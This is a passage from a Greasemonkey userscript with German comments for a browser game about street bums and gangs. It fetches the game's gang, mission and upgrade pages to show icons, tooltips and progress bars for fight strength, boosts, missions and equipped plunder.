                    var pos = zeitText.indexOf(':');
                    var tage = "Tag";
                    if (zeitText.substr(0, pos) != 1)
                        tage += "e";
                    zeitText = zeitText.substr(0, pos) + " " + tage + " " + zeitText.substr(pos + 1);
                }
                var text = balkData[i][2].replace("%s", (textsub == ""?zeitText:zeitText.replace(', Ende:', textsub)));
                document.getElementById(target).title = text;
                break;
            }
        }
    }
    if (!document.getElementById(id+'bg'+idx))
        return;
    document.getElementById(id+'bg'+idx).addEventListener('mouseover', actTime, false);
    if (document.getElementById(id+'fg'+idx))
        document.getElementById(id+'fg'+idx).addEventListener('mouseover', actTime, false);

    var actBalk = function () {
        var now = new Date();
        now = Math.floor(now.getTime()/1000);
        var rtime = balkData[indx][3] - (now - balkData[indx][4]);
        var nwidth = Math.ceil(rtime/balkData[indx][5]*balkData[indx][6]);
        if (nwidth > 0)
            if (document.getElementById(balkData[indx][7] + 'fg' + balkData[indx][0]))
                document.getElementById(balkData[indx][7] + 'fg' + balkData[indx][0]).width = nwidth;
        else {
            refreshPage();
        }
        window.setTimeout(actBalk, nextRun());
    }

    function nextRun () {
        indx = 0;
        var now = new Date();
        now = Math.floor(now.getTime()/1000);
        var rtime = balkData[indx][3] - (now - balkData[indx][4]);
        var nextTime = Math.floor(mod(rtime, balkData[indx][5]/balkData[indx][6]) * 1000);
        for (var i = 1; i < balkData.length; i++)
            if (Math.floor(mod(rtime, balkData[i][5]/balkData[i][6]) * 1000) < nextTime) {
                nextDecr = Math.floor(mod(rtime, balkData[i][5]/balkData[i][6]) * 1000);
                indx = i;
            }
        if (nextTime < 500)
            nextTime = 500;
        return nextTime;
    }

    window.setTimeout(actBalk, nextRun());

}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt die aktuellen Kampfwerte
// **********************************************************************************
// **********************************************************************************
function CheckFightValues(content) {
    // Aus HTML ein DOM-Objekt erzeugen
    var doc = HTML2DOM(content)

    var table = doc.getElementsByTagName("table")[0];

    // Referenz auf Tabellenzeilen in trs speichern
    var trs = table.getElementsByTagName("tr");

    if (trs[2].getElementsByClassName("fight_num").length > 0) {
        // Eigenen ATT-Wert ermitteln
        attvalue = Number(trs[2].getElementsByClassName("fight_num")[0].innerHTML);
        // Eigenen DEF-Wert ermitteln
        defvalue = Number(trs[2].getElementsByClassName("fight_num")[1].innerHTML);
    }
    else {
        // Eigenen ATT-Wert ermitteln
        attvalue = Number(GetValueFromRow(trs[2]));
        // Eigenen DEF-Wert ermitteln
        defvalue = Number(GetValueFromRow(trs[3]));
    }

    // ATT-Wert um eine eventuell vorhandene ATT-Stärkung (z.B. schwarzes Loch +1, +2, +3) korrigieren
    var ATTBoost = GetATTBoost(table.innerHTML);
    if (ATTBoost > 0) {
        attvalue = attvalue - ATTBoost;
        var img = ICON_BOOU;
        if (ATTBoost == 1)
            img = ICON_BOO1;
        else if (ATTBoost == 2)
            img = ICON_BOO2;
        else if (ATTBoost == 3)
            img = ICON_BOO3;
        else if (ATTBoost == 4)
            img = ICON_BOO4;
        else if (ATTBoost == 10)
            img = ICON_BOO10;
        var attboost = content.split("<span><b>" + TxtBoost[lang] + "</b>")[1];
        attboost = attboost.split(TxtATTBoost[lang])[1];
        attboost = trimString(attboost.split("<br />")[2].replace("<b>","").replace("</b>",""));
        var titletext = "ATT-" + getLangTxt(TxtBoost) + " +" + ATTBoost + ". " + attboost;
        ShowImg ('ADBACK', FIGHT_URL, img, titletext, 37, 37, 1, 14, 1, 'attboost');
    }

    // DEF-Wert um eine eventuell vorhandene DEF-Stärkung (z.B. Kürbis) korrigieren
    var DEFBoost = GetDEFBoost(table.innerHTML);
    if (DEFBoost > 0) {
        defvalue = defvalue - DEFBoost;
        var img = ICON_BOOU;
        if (DEFBoost == 1)
            img = ICON_BOO1;
        else if (DEFBoost == 2)
            img = ICON_BOO2;
        else if (DEFBoost == 3)
            img = ICON_BOO3;
        else if (DEFBoost == 4)
            img = ICON_BOO4;
        else if (DEFBoost == 10)
            img = ICON_BOO10;
        var defboost = content.split("<span><b>" + TxtBoost[lang] + "</b>")[1];
        defboost = defboost.split(TxtDEFBoost[lang])[1];
        defboost = trimString(defboost.split("<br />")[2].replace("<b>","").replace("</b>",""));
        var titletext = "DEF-" + getLangTxt(TxtBoost) + " +" + DEFBoost + ". " + defboost;
        ShowImg ('ADBACK', FIGHT_URL, img, titletext, 37, 37, 43, 14, 1, 'defboost');
    }

    // ATT-Wert um eine eventuelle Verletzung korrigieren
    var injury = GetInjury(table.innerHTML);
    if (injury < 0) {
        attvalue = attvalue - injury;
        var img = ICON_MINU;
        if (injury == -1)
            img = ICON_MIN1;
        else if (injury == -2)
            img = ICON_MIN2;
        else if (injury == -3)
            img = ICON_MIN3;
        else if (injury == -4)
            img = ICON_MIN4;
        else if (injury == -10)
            img = ICON_MIN10;
        var injboost = content.split("<span><b>" + TxtInjury[lang] + "</b>")[1];
        injboost = injboost.split(TxtATTBoost[lang])[1];
        injboost = trimString(injboost.split("<br />")[2].replace("<b>","").replace("</b>",""));
        var titletext = "ATT-" + getLangTxt(TxtInjury) + " " + injury + ". " + injboost;
        if (ATTBoost > 0) {
            document.getElementById('attboost').setAttribute('width', '18px');
            ShowImg ('ADBACK', FIGHT_URL, img, titletext, 18, 37, 19, 14, 1, 'injboost');
        }
        else
            ShowImg ('ADBACK', FIGHT_URL, img, titletext, 37, 37, 1, 14, 1, 'injboost');
    }

    // DEF-Wert um eine eventuelle Verletzung korrigieren (> 0 wenn DEF-Wert gesenkt)
    injury = GetInjury(table.innerHTML);
    if (injury > 0) {
        defvalue = defvalue + injury;
        var img = ICON_MINU;
        if (injury == 1)
            img = ICON_MIN1;
        else if (injury == 2)
            img = ICON_MIN2;
        else if (injury == 3)
            img = ICON_MIN3;
        else if (injury == 4)
            img = ICON_MIN4;
        else if (injury == 10)
            img = ICON_MIN10;
        var injboost = content.split("<span><b>" + TxtInjury[lang] + "</b>")[1];
        injboost = injboost.split(TxtDEFBoost[lang])[1];
        injboost = trimString(injboost.split("<br />")[2].replace("<b>","").replace("</b>",""));
        var titletext = "DEF-" + getLangTxt(TxtInjury) + " " + injury + ". " + injboost;
        if (DEFBoost > 0) {
            document.getElementById('defboost').setAttribute('width', '18px');
            ShowImg ('ADBACK', FIGHT_URL, img, titletext, 18, 37, 61, 14, 1, 'injboost');
        }
        else
            ShowImg ('ADBACK', FIGHT_URL, img, titletext, 37, 37, 43, 14, 1, 'injboost');
    }
    glblVars[16] = attvalue;
    glblVars[17] = defvalue;
    glblVars[18] = GetPower(attvalue, defvalue);

    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** Abrufen der Bandenseite
    // **********************************************************************************
    GM_xmlhttpRequest({method: 'GET', url: GANG_URL,onload: function(gangresponseDetails) {
        // Wenn die Bandenseite abgerufen werden konnte
        if (gangresponseDetails.status == 200 &&
            gangresponseDetails.responseText.indexOf('500 - Internal Server Error') == -1 &&
            gangresponseDetails.responseText.indexOf(KEYWORD_MYBUM[lang]) != -1) {
            var goMission = function(event) {
                if (event.shiftKey != 0) {
                    var misPan = PGu_getValue("ShowMissionPanel", 1);
                    PGu_setValue("ShowMissionPanel", 1 - misPan);
                    refreshPage();
                }
                else
                    window.location.href = TOWNBASE_URL + 'gang/missions/';
            }
            // Content der Bandenseite speichern
            var gangcontent = gangresponseDetails.responseText;
//			// Wenn man in einer Bande ist
            GM_log("gangcontent.indexOf(KEYWORD_INGANG[lang]) == -1: " + gangcontent.indexOf(KEYWORD_INGANG[lang]) == -1);
            if (gangcontent.indexOf(KEYWORD_INGANG[lang]) == -1) {
                GM_log("IN BANDE");
                PGu_setValue("inGang", "1");
                var noGangAbl = gangcontent.indexOf(TxtNoGangAbility[lang]);
                glblVars[13] = -1;
                // Aus HTML ein DOM-Objekt erzeugen
                var doc = HTML2DOM(gangcontent)
                if (PGu_getValue("ShowMissionPanel", 1) == 0) {
                    document.getElementById("MIBACK").addEventListener("click", goMission, false);
                }
                else if (lang == 0) {
                    var trs = doc.getElementsByTagName("tr");
                    if (trs[2].getElementsByTagName("span").length > 0) {
                        var td = trs[2].getElementsByTagName("td")[0];
                        for (var i = 0; i < td.getElementsByTagName("div").length; i++)
                            if (td.getElementsByTagName("div")[i].getElementsByTagName("div").length > 0)
                                if (td.getElementsByTagName("div")[i].getElementsByTagName("div")[0].getElementsByTagName("img").length != 0)
                                    break;
                        var pic = td.getElementsByTagName("div")[i].getElementsByTagName("div")[0].getElementsByTagName("img")[0].getAttribute('src').toString();
                        var boosttxt = td.getElementsByTagName("span")[0].innerHTML.split("<b>")[1].split("<")[0] + " " + td.getElementsByTagName("div")[i].getElementsByTagName("div")[1].getElementsByTagName("span")[0].innerHTML;
                        ShowImg('MIBACK', goMission, pic, boosttxt, '', '', 3, 13, 6, 'gangboost');
                        var counter = Number(td.getElementsByTagName("div")[i].getElementsByTagName("div")[1].getElementsByTagName("span")[1].innerHTML.split("counter(")[1].split(")")[0]);
                        if (counter < 0) {
                            var width = 40;
                            var text = "noch nicht aktiviert";
                        }
                        else {
                            var jetzt = new Date();
                            jetzt = Math.floor(jetzt.getTime()/1000);
                            var end_time = jetzt + Number(counter);
                            var width = Math.ceil(Number(counter) / maxBoostTime * 40);
                            var text = "noch " + FmtInfo(jetzt, end_time);
                        }
                        ShowImg ('MIBACK', goMission, ICON_PLUNDERB, text, 40, 5, 1, 45, 2, 'missbg4');
                        if (width > 0)
                            ShowImg ('MIBACK', goMission, ICON_CLEAN, text, width, 5, 1, 45, 4, 'missfg4');
                        if (counter >= 0) {
                            balkDisp('missbg4', end_time, "noch %s", counter, jetzt, maxBoostTime, 40, "");
                        }
                    }

                    GM_xmlhttpRequest({method: 'GET', url: MISSION_URL, onload: function(missresponseDetails) {
                        // Wenn die Missionsseite abgerufen werden konnte
                        if (missresponseDetails.status == 200 &&
                            missresponseDetails.responseText.indexOf('500 - Internal Server Error') == -1 &&
                            missresponseDetails.responseText.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                            // Content der Bandenupgradeseite speichern
                            var misscontent = missresponseDetails.responseText;
                            var doc = HTML2DOM(misscontent);
                            var table = doc.getElementsByTagName("table");
                            var anzMiss = table.length;
                            if (anzMiss <= 5)
                                var y = 46;
                            else
                                var y = (anzMiss * 8) + 6;
                            for (i = 0; i < anzMiss; i++) {
                                var td = table[i].getElementsByTagName("tr")[1].getElementsByTagName("td")[1];
                                var desc = td.getElementsByClassName("mission_desc")[0].getElementsByTagName("h1")[0].innerHTML;
                                var wdh = 0;
                                if (td.getElementsByClassName("mission_repeate").length > 0) {
                                    wdh = td.getElementsByClassName("mission_repeate")[0].innerHTML.split(" ");
                                    if (wdh.length <= 5)
                                        wdh = 0;
                                    else if (wdh[5].substr(0,3) == "Tag")
                                        wdh = wdh[4] * 86400;
                                    else if (wdh[5].substr(0, 6) == "Stunde")
                                        wdh = wdh[4] * 3600;
                                    else
                                        wdh = 0;
                                }
                                var stages = td.getElementsByClassName("stage_area");
                                var text0 = stages[0].innerHTML;
                                if (text0.indexOf("counter") == -1) {
                                    var waitTime = 0; // keine Wartezeit
                                }
                                else {
                                    var waitTime = text0.split("counter(")[1].split(")")[0];
                                }
                                var balken = ICON_PLUNDERA;
                                var text = stages[1].innerHTML;
                                var zeit = 0;
                                var zeitText = "";
                                var textsub = "";
                                var width = 0;
                                if (text.indexOf("mission_stage_done") != -1)
                                    text = "beendet";
                                else if (text.indexOf("bare Zeit") != -1) {
                                    zeit = text.split("bare Zeit: ")[1].split("<")[0].split(" ");
                                    zeit = zeit[0] * 3600;
                                    for (j = 0; j < missions.length; j++)
                                        if (missions[j] == desc) {
                                            break;
                                        }
                                    if (j == missions.length)
                                        PG_setValue(desc + "dauer", zeit);
                                    if (waitTime == 0 && text0.indexOf("mission_stage_done") == -1)
                                        zeit = -1;
                                }
                                else if (waitTime == 0 && text0.indexOf("mission_stage_done") == -1)
                                    zeit = -1;
                                else if (text.indexOf("bende Zeit") != -1) {
                                    waitTime = text.split("counter(")[1].split(")")[0];
                                    balken = ICON_CLEAN;
                                    var proceed = stages[1].getElementsByClassName("job_progress_amount")[0].innerHTML;
                                    for (j = 0; j < missions.length; j++)
                                        if (missions[j] == desc) {
                                            wdh = missDauer[j];
                                            break;
                                        }
                                    if (wdh == 0)
                                        wdh = PG_getValue(desc + "dauer", waitTime);
                                }
                                var width = 0;
                                if (zeit > 0 && waitTime == 0) {
                                    text = "kann gestartet werden";
                                    balken = ICON_CLEAN;
                                    width = 40;
                                }
                                else if (zeit < 0) {
                                    text = "Plunder fehlt";
                                }
                                else if (waitTime > 0) {
                                    var jetzt = new Date();
                                    jetzt = Math.floor(jetzt.getTime()/1000);
                                    var end_time = jetzt + Number(waitTime);
                                    var width = Math.ceil(Number(waitTime) / wdh * 40);
                                    zeitText = FmtInfo(jetzt, end_time);
                                    if (waitTime >= 86400) {
                                        var pos = zeitText.indexOf(':');
                                        var tage = "Tag";
                                        if (zeitText.substr(0, pos) != 1)
                                            tage += "e";
                                        zeitText = zeitText.substr(0, pos) + " " + tage + " " + zeitText.substr(pos + 1);
                                    }
                                    if (balken == ICON_PLUNDERA) {
                                        text = "noch %s";
                                        textsub = " warten, Start am:";
                                    }
                                    else {
                                        text = "läuft (" + proceed + "), noch %s";
                                    }
                                }
                                text = desc + ": " + text;
                                var balkText = text.replace('%s', (textsub == ""?zeitText:zeitText.replace(', Ende:', textsub)));
                                ShowImg ('MIBACK', goMission, ICON_PLUNDERB, balkText, 40, 5, 44, y, 2, 'missbg'+(i+5));
                                if (width > 0) {
                                    ShowImg ('MIBACK', goMission, balken, balkText, width, 5, 44, y, 4, 'missfg'+(i+5));
                                    balkDisp('missbg'+(i+5), end_time, text, waitTime, jetzt, wdh, 40, textsub);
                                }
                                y -= 8;
                            }
                        }
                    }});
                }

                GM_xmlhttpRequest({method: 'GET', url: GANGUPGRADE_URL,onload: function(gangresponseDetails) {
                	// Wenn die Bandenseite abgerufen werden konnte
                	if (gangresponseDetails.status == 200 &&
                		gangresponseDetails.responseText.indexOf('500 - Internal Server Error') == -1 &&
                		gangresponseDetails.responseText.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                		// Content der Bandenupgradeseite speichern
                		var gangupgcontent = gangresponseDetails.responseText;

                		if (oldVersion)
                			var WutActive = gangupgcontent.indexOf(TxtAbility1[lang]) != -1;
                		else  {
                			var table2 = doc.getElementsByTagName("table")[0];
                			var trs2 = table2.getElementsByTagName("tr");
                			var tds = trs2[2].getElementsByTagName("td");
                			var WutActive = tds[0].innerHTML.indexOf("<strong>") != -1;
                			if (WutActive) {
                				var counter = tds[0].innerHTML.split("counter(")[1].split(")")[0];
                				var jetzt = Math.floor(now.getTime()/1000);
                				var WutEnde = FmtInfo(0, jetzt + Number(counter));
                				WutDatum = WutEnde.substr(WutEnde.indexOf(":") + 2);
                			}
                		}

                		glblVars[13] = 0;
                		glblVars[14] = "";
                		if (WutActive) {
                			glblVars[13] = 2;
                			// Korrigieren der ATT-Summe um 4 bzw. 5 ATT-Punkte
                			if (WiWut == 1) {
                				glblVars[13] = 1;
                				if (noGangAbl == -1)
                					attvalue = attvalue - (nrOfTabs==6?5:4);
                				// **********************************************************************************
                				// Text auf Kampfseite einblenden, wenn Wut aktiv ist
                				// **********************************************************************************
                				// Wenn die aktuelle Seite die Kampfseite ist und kein Counter in der ersten Zeile
                				if (IsFightPage() && document.getElementById("content").getElementsByTagName("table")[0].getElementsByTagName("tr")[0].innerHTML.indexOf("counter") == -1) {
                					var table2 = doc.getElementsByTagName("table")[0];
                					var trs2 = table2.getElementsByTagName("tr");
                					var newtr = trs2[2].cloneNode(true);
                					if (newtr.getElementsByTagName("span").length > 0) {
                						var tds = newtr.getElementsByTagName("span");
                						tds[0].parentNode.removeChild(tds[0]);
                						tds = newtr.getElementsByTagName("div");
                						tds[2].parentNode.removeChild(tds[2]);
                					}
                					newtr.getElementsByTagName("td")[0].setAttribute('colspan', 2);
                					if (!oldVersion) {
                						var td = newtr.getElementsByTagName("script");
                						td[0].parentNode.removeChild(td[0]);
                						var jetzt = new Date();
                						jetzt = Math.floor(jetzt.getTime()/1000);
                						var end_time = jetzt + Number(counter);
                						newtr.getElementsByTagName("td")[0].innerHTML = newtr.getElementsByTagName("td")[0].innerHTML.replace("()", FmtInfo(0, end_time).substr(1));
                					}
                					table2 = document.getElementById("content").getElementsByTagName("table")[0];
                					trs2 = table2.getElementsByTagName("tr");
                					trs2[1].parentNode.insertBefore(newtr, trs2[1]);
                				}
                			}

                			if (oldVersion) {
                				wuttext = gangupgcontent.split(TxtAbility2[lang])[1];
                				WutDatum = wuttext.substr(8,2) + getLangTxt(DS) + wuttext.substr(5,2) + getLangTxt(DS) + wuttext.substr(0,4) + wuttext.substr(10,9);
                			}

                			glblVars[14] = WutDatum;
                			if (noGangAbl != -1) {
                				WutDatum += " (" + getLangTxt(TxtNoProfAbility) + ")";
                				// WiWu- bzw. Wutstatus speichern
                				PGu_setValue("WutActive", WUTSTATE_INACTIVE);
                				}
                			else
                				// WiWu- bzw. Wutstatus speichern
                				PGu_setValue("WutActive", WUTSTATE_ACTIVE);
                			ShowWutIcon(PGu_getValue("WutActive", WUTSTATE_ERROR));

                		// sonst: WiWu bzw. Wut ist nicht gestartet
                		} else {
                			// WiWu- bzw. Wutstatus speichern
                			PGu_setValue("WutActive", WUTSTATE_INACTIVE);
                		}
                		ShowWutIcon(PGu_getValue("WutActive", WUTSTATE_ERROR));

                		// Vergleich der aktuellen Stärke mit der Max-Stärke
                		ComparePower(attvalue, defvalue, promille);
                		GetAllValues(attvalue, defvalue);
                	} else {
                		// Powerwerte können nicht richtig berechnet werden
                		ShowFightStateIcon(FIGHTSTATE_ERROR, 0);
                		glblVars[7] = 1.0;
                		glblVars[8] = 1.0;
                		noUpdate = true;
                		// Anzeige des WiWu- bzw. Wut-Status
                		ShowWutIcon(WUTSTATE_ERROR);
                		GetAllValues(attvalue, defvalue);
                	}
                }});
            // sonst: Bandenseite konnte nicht geladen werden
            } else {
                GM_log("NICHT IN BANDE");

                // WiWu- bzw. Wutstatus speichern (keine Wut)
                PGu_setValue("WutActive", WUTSTATE_INACTIVE);

                glblVars[7] = 1.0;
                glblVars[8] = 1.0;
                // Anzeige des WiWu- bzw. Wut-Status
                ShowWutIcon(PGu_getValue("WutActive", WUTSTATE_ERROR));

                // Vergleich der aktuellen Stärke mit der Max-Stärke
                ComparePower(attvalue, defvalue, promille);
                GetAllValues(attvalue, defvalue);
            }
        } else {
            // Powerwerte können nicht richtig berechnet werden
            ShowFightStateIcon(FIGHTSTATE_ERROR, 0);
            glblVars[7] = 1.0;
            glblVars[8] = 1.0;
            noUpdate = true;
            // Anzeige des WiWu- bzw. Wut-Status
            ShowWutIcon(WUTSTATE_ERROR);
        }

    }});
}

// **********************************************************************************
// **********************************************************************************
// lädt eine Seite neu
// **********************************************************************************
// **********************************************************************************
function refreshPage() {
    var page = location.toString();
    if (Right$(page, 18) == "activities/bottle/")
        page = page.substr(0, page.length-7);
    else if (Right$(page, 10) == "games/buy/" || Right$(page, 13) == "district/buy/")
        page = page.substr(0, page.length-4);

    window.location.href = page;
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt das Bandenkampf-Icon an
// **********************************************************************************
// **********************************************************************************
function ShowGangFightIcon(GangFightIcon, GangfightTitle) {
    ShowImg('GFBACK', '/gang/fight/', ICON_GANGFIGHT[GangFightIcon], GangfightTitle, ICON_WIDTH, ICON_WIDTH, 10, 15, 6, 'gangfight');
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt das Neu-Icon an
// **********************************************************************************
// **********************************************************************************
function ShowNewIcon() {
    ShowImg('GFBACK', '/gang/fight/', ICON_NEW, '', '', '', 30, 12, 7, 'gangfightnew');
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt das Kampf-Icon und die eintreffenden Kämpfe als Tooltip an
// **********************************************************************************
// **********************************************************************************
function ShowFightIcon(FightIcon, FightTitle) {
    var FT = null;
    var width = 400;
    function updateFT(e) {
        if (FT != null && FT.style.display == 'block') {
            x = (e.pageX ? e.pageX : window.event.x) + FT.offsetParent.scrollLeft - FT.offsetParent.offsetLeft;
            y = (e.pageY ? e.pageY : window.event.y) + FT.offsetParent.scrollTop - FT.offsetParent.offsetTop;
            FT.style.left = x + (FB_X<width-30?0:20-width) + "px";
            FT.style.top  = (y + 20) + "px";
        }
    }
    function showFT(id) {
        FT = document.getElementById(id);
        if (FT)
            FT.style.display = "block";
    }
    function mouseOverShow() {
        showFT("fightTT");
    }
    function hideFT () {
        if (!FT)
            return;
        FT.style.display = "none";
        FT = null;
    }

    var tooltip = new Array();
    if (FightTitle != "") {
        tooltip[0] = 'id="fightTT" style="width:'+width+'px;background-color: #505050; font-size:10px; position:absolute; display:none; z-index:'+(getZ("FBBACK")+5)+'"';
        tooltip[1] = '<table><colgroup><col width="'+width/10*6+'" /><col width="'+width/40+'" /><col width="'+width/8*3+'" /></colgroup>' + FightTitle + '</table>';
    }
    ShowImg('FBBACK', '/fight/overview/#form1', ICON_FIGHT[FightIcon], tooltip, ICON_WIDTH, ICON_WIDTH, 10, 15, 2, 'fight');
    if (FightTitle != "") {
        document.getElementById("fightlnk").addEventListener('mouseover', mouseOverShow, false);
        document.getElementById("fightlnk").addEventListener('mouseout', hideFT, false);
        document.addEventListener('mousemove', updateFT, false);
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt das Kampfstatus-Icon an
// **********************************************************************************
// **********************************************************************************
function ShowFightStateIcon(FightState, currentpower, maxpower) {
    switch (FightState) {
        case FIGHTSTATE_OK:
            ShowFightImg(ICON_FIGHT_OK, printf(getLangTxt(TOOLTIP_FIGHTOK), currentpower), '', '', 90, 22, 2);
            break;
        case FIGHTSTATE_WEAK:
            ShowFightImg(ICON_FIGHT_WEAK, printf(getLangTxt(TOOLTIP_FIGHTWEAK), currentpower, maxpower), '', '', 90, 22, 2);
            break;
        case FIGHTSTATE_DANG:
            ShowFightImg(ICON_FIGHT_DANG, printf(getLangTxt(TOOLTIP_FIGHTDANG), currentpower, maxpower), 25, 25, 90, 22, 2);
            break;
        case FIGHTSTATE_ERROR:
            ShowImg('PBBACK', '', ICON_ERROR, getLangTxt(TOOLTIP_LOADERROR), '', '', 90, 22, 2, 'fightstateerror');
            break;
        default:
            ShowImg('PBBACK', '/gang/upgrades/', ICON_ERROR, 'Unbekannter Zustand!', '', '', 90, 22, 2, 'resetfight');
            break;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt Hintergrundgrafiken an
// **********************************************************************************
// **********************************************************************************
function ShowBackgrounds(version, gangid) {
    if (gangid > 0) {
        ShowImg('', '', ICON_GANGFIGHTBACK[version], '', '', '', GF_X, GF_Y, '', 'GFBACK');
        if (lang == 0)
            ShowImg('', '', ICON_MISSIONBACK[version], '', '', '', MI_X, MI_Y, '', 'MIBACK');
    }
    else if (gangid < 0) {
        ShowImg('', '', ICON_FIGHTBACK[version], '', '', '', FB_X, FB_Y, '', 'FBBACK');

        ShowImg('', '', ICON_PLUNDERDIRECTBACK[version], '', '', '', PD_X, PD_Y, '', 'PDBACK');
        if (!oldVersion)
            ShowImg('', '', ICON_PLUNDERSHOPBACK[version], '', '', '', PS_X, PS_Y, '', 'PSBACK');
	if (noWash)
            ShowImg('', '', ICON_PROMILLEBACK2[version], '', '', '', PW_X, PW_Y, '', 'PWBACK');
	else
            ShowImg('', '', ICON_PROMILLEBACK[version], '', '', '', PW_X, PW_Y, '', 'PWBACK');
        ShowImg('', '', ICON_ATTDEFWPNBACK[version], '', '', '', AD_X, AD_Y, '', 'ADBACK');
        ShowImg('', '', ICON_SKLCRDCRTBACK[version], '', '', '', SC_X, SC_Y, '', 'SCBACK');
        if (lockmove)
            ShowImg ('PDBACK', '', ICON_LOCK, getLangTxt(TOOLTIP_LOCK), 10, 10, 240, 1, 1, 'lockmove');
        var langSel = ShowImg('PDBACK', '', getLangTxt(ICON_FLAGS), getLangTxt(TxtLang), 16, 11, 2, 1, 2, 'langSelect');
        langSel.addEventListener("click", function(event) {
            myLang++;
            if (myLang == ICON_FLAGS.length)
               myLang = 0;
            this.src = getIconAddr(getLangTxt(ICON_FLAGS));
            this.title = getLangTxt(TxtLang);
            PG_setValue("myLang", myLang);		// Sprache speichern
        }, false);
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt Power-Grafik mit Rücksetzmöglichkeit an
// **********************************************************************************
// **********************************************************************************
function ShowFightImg(imgsource, imgtitle, imgwidth, imgheight, imgleft, imgtop, imgzindex) {
    var curElem = ShowImg ('PBBACK', "#", imgsource, imgtitle, imgwidth, imgheight, imgleft, imgtop, imgzindex, 'resetfight');
    if (curElem == null)
        return;
    curElem.addEventListener("click", function(event)
    {
        // Kampfstärke auf 0 zurücksetzen
        PGu_setValue("PowerMaxValue", "0");
        alert(getLangTxt(ALERT_RESETPOWER))
    }, false);
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt Plunder an
// **********************************************************************************
// **********************************************************************************
function ShowCurrentPlunder(plunderimg, plundername, big) {
    // Wenn derzeit kein Plunder angelegt ist
    if (plunderimg == "none") {
        plunderimg = ICON_NOPLUNDEREQUIP;
        plundername = TxtNoJunk[lang];
    }

    var size = big?"":"16";
    ShowImg('PBBACK', '/stock/plunder/', plunderimg, plundername, size, size, (oldVersion?7:2), (oldVersion?23:16), 10, 'actplunder');
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt das Wut-Icon an
// **********************************************************************************
// **********************************************************************************
function ShowWutIcon(WutState) {
    // Wenn das Icon noch nicht angezeigt wird
    var wuttd = document.getElementById("wutstate");
    var wuttext = "";
    switch (WutState) {
        case WUTSTATE_ACTIVE:
            if (WiWut != 0 && WutDatum != "")
                wuttext = getLangTxt(TxtWiWut[WiWut-1]) + getLangTxt(TOOLTIP_WIWUTAKTIV) + WutDatum;
            if (wuttd == null)
                wuttd = ShowImg('PBBACK', '/gang/upgrades/', ICON_WUTAKTIV, '', '', '', 49, 23, 11, 'wutstate');
            break;
        case WUTSTATE_INACTIVE:
            if (WutDatum != "") {
                wuttext = getLangTxt(TxtWiWut[WiWut-1]) + getLangTxt(TOOLTIP_WIWUTAKTIV) + WutDatum;
                if (wuttd == null) {
                    wuttd = ShowImg('PBBACK', '', ICON_WUTAKTIV, "", '', '', 49, 23, 11, 'wutstate2');
                    ShowImg('PBBACK', '/gang/upgrades/', ICON_WUTINAKTIV, '', '', '', 49, 23, 11, 'wutstate');
                }
            }
            else if (m_owngangid != 0) {
                if (WiWut != 0) {
                    wuttext = getLangTxt(TxtWiWut[WiWut-1]) + getLangTxt(TOOLTIP_WIWUTINAKTIV);
                    if (wuttd == null)
                        wuttd = ShowImg('PBBACK', '/gang/upgrades/', ICON_WUTINAKTIV, '', '', '', 49, 23, 11, 'wutstate');
        }
        else {
                    if (wuttd == null)
                        wuttd = ShowImg('PBBACK', '/gang/', ICON_WUTAKTIV, '', '', '', 49, 23, 11, 'wutstate');
        }
            }
            else {
                if (wuttd == null)
                    wuttd = ShowImg('PBBACK', '/gang/', ICON_WUTINAKTIV, '', '', '', 49, 23, 11, 'wutstate');
                wuttext = getLangTxt(KEYWORD_INGANG) + "!!";
            }
            break;
        case WUTSTATE_ERROR:
            ShowImg('PBBACK', '/gang/upgrades/', ICON_ERROR, getLangTxt(TOOLTIP_LOADERROR), '', '', 49, 23, 11, 'wutstate');
            break;
    }
    if (wuttext != "" && wuttd != null) {
        wuttd.title = wuttext;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt die Plunderbox-Version
// **********************************************************************************
// **********************************************************************************
function GetPlunderBoxVersion(content) {
    return content.indexOf("box special") != -1;
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt den Namen des aktuellen Plunders
// **********************************************************************************
// **********************************************************************************
function GetCurrentPlundername(plunderbox) {
    var plundername = "";
    if (oldVersion) {
        // Wenn derzeit ein Plunder angelegt ist
        if (plunderbox.innerHTML.indexOf('</h4>') != -1) {
            // Namen des aktuellen Plunderstücks extrahieren
            plundername = plunderbox.innerHTML.split('</h4>')[0];
            plundername = plundername.split('alt=" "> ')[1];
        }
    } else {
        var plunderimg = plunderbox.getElementsByTagName("img")[0].getAttribute('src').toString();
        // Wenn derzeit ein Plunder angelegt ist
        if (plunderimg.split('/').pop() != "empty.png") {
            var plunderbx = plunderbox.getElementsByTagName("tr")[1].getElementsByTagName("td")[1].innerHTML;
            // Namen des aktuellen Plunderstücks extrahieren
            var plundername = plunderbx.split('</strong>')[0].split("<strong")[1].split(">")[1];
        }
    }
    return plundername;
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt aktuellen Plunder, speichert Image und Name und stellt den
// aktuellen Plunder dar
// **********************************************************************************
// **********************************************************************************
function GetCurrentPlunder(content) {
    // Aus dem Responsetext ein Document machen
    var doc = HTML2DOM(content);

    var plunderbox = doc.getElementsByClassName(oldVersion?"box special":"box")[0];
    var plundername = GetCurrentPlundername(plunderbox);

    // Wenn derzeit kein Plunder angelegt ist
    if (plundername == "") {
        plundername = "none";
        var plunderimg = "none";
    // sonst: Es ist derzeit ein Plunder angelegt
    } else {
        // URL des aktuellen Plunderstücks extrahieren
        var plunderimg = plunderbox.getElementsByTagName("img")[0].getAttribute('src').toString();
    }
    // Image-URL und Namen speichern
    PGu_setValue("LastPlunderImg", plunderimg);
    PGu_setValue("LastPlunderName", plundername);

    if (plunderimg == "none") {
        plunderimg = ICON_NOPLUNDEREQUIP;
        plundername = TxtNoJunk[lang];
    }
    if (oldVersion)
        // Angelegten Plunder anzeigen
        ShowCurrentPlunder(plunderimg, plundername, 1);
    else {
        function mouseOver(e) {
            var elem = e.target;
